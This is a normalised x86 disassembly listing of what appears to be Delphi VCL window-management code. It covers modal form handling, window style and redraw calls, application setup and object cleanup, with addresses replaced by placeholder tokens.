mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_469a8c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42386c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469aea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403190
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_469af8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_40338c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_469b24
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46d2a8
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_40338c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_469cc4
jmp r-xdata
mov eax ebx
call sub_469d60
mov dl 0x1
mov eax ebx
call sub_4678b0
jmp r-xdata
sub_469bc8
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_46723c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_467288
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_469c2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403670#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40338c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_469d60
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469ce4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_469d52
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d59
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_46853c
sub_469d7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a044
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_44b9ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_46c21c
xor edx edx
push ebp
push sub_46a027
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_4184ec
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_46b24c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_46414c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_46a005
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_469ccc
xor edx edx
push ebp
push sub_469f64
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_469c2c
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46d028
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_453a88
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469f6b
mov eax [ ebp - 0x4 ]
call sub_469cc4
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_469f6b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a00f
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46b24c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_46b24c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_418468
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41860c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_464200
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_46a054
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46a054
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45077c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_46a0c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_46a054
pop ecx
mov eax [ esi + 0x34 ]
call sub_45f5a4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45f5b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_46a148
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451dd8
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_40338c
sub_46a16c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40338c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46a19c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46a16c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46a19c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45077c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a218
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46a16c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46a16c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46a19c
pop ecx
test al al
je r-xdata
sub_46a26c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_40338c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46a29c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46a26c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46a29c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45077c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a318
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46a26c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46a26c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46a29c
pop ecx
test al al
je r-xdata
sub_46a36c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_418470
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_459734
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46a3c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46a36c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_40338c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a43c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_420ee4
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_46a478
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44d670
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44e340
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46a4c0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_453a88
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_453a88
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_453a88
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_453a88
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_453a88
push eax
call RedrawWindow
sub_46a614
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_4653c4
mov dl 0x5
mov eax ebx
call sub_467138
mov dl 0x1
mov eax ebx
call sub_452664
mov dl 0x3
mov eax ebx
call sub_467434
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a67c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46a753
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_452524
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_452390
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_44c6a0
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d100
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404010
mov eax [ ebp - 0xc ]
call sub_4041e0
push eax
mov eax [ ebp - 0xc ]
call sub_4043e0
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_44d110
mov eax [ ebp - 0xc ]
call sub_4041e0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a75a
lea eax [ ebp - 0xc ]
call sub_403f20
retn
mov dl 0x1
mov eax esi
call sub_4667b8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_44d1bc
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_40456c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46a780
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4507b8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_465edc
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_45077c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40338c
inc ebp
dec edi
jne r-xdata
sub_46a7cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_452524
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46a7f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452d2c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_46a820
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_468b88
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_453a88
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_452524
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453a88
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_453a88
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_452538
or ecx 0xffffffff
mov dl 0x1
call sub_44d834
pop esi
pop ebx
retn
sub_46a8b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45319c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44e340
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_44cb2c
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40338c
sub_46a910
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46a9d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44d100
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404010
mov eax [ ebp - 0x4 ]
call sub_4041e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_44d110
mov eax [ ebp - 0x4 ]
call sub_4041e0
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44d1bc
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9dd
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_4667b8
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_40456c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46a9fc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_452f1c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452524
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_452538
mov dl [ ebx + 0x57 ]
call sub_44d0ac
inc edi
dec esi
jne r-xdata
sub_46aaa0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46aad0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46ab00
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420754
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46aea4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46aeb0
mov eax ebx
call sub_46aebc
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4672d8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42386c
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42386c
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42386c
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_46b2dc
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46b1b8
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46b1b8
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46b1b8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_46ac58
push ebx
push esi
push edi
push ebp
call sub_40355c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403190
mov eax [ ebp + 0x88 ]
call sub_403190
mov eax [ ebp + 0x84 ]
call sub_403190
mov eax [ ebp + 0x54 ]
call sub_403190
mov eax [ ebp + 0x50 ]
call sub_403190
mov eax [ ebp + 0x4c ]
call sub_403190
mov eax [ ebp + 0x30 ]
call sub_403190
mov eax [ ebp + 0x34 ]
call sub_403190
mov eax [ ebp + 0x7c ]
call sub_403190
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403190
mov eax ebp
call sub_46af18
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4207a0
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403544
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_418470
call sub_403190
inc edi
dec esi
jne r-xdata
sub_46add0
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
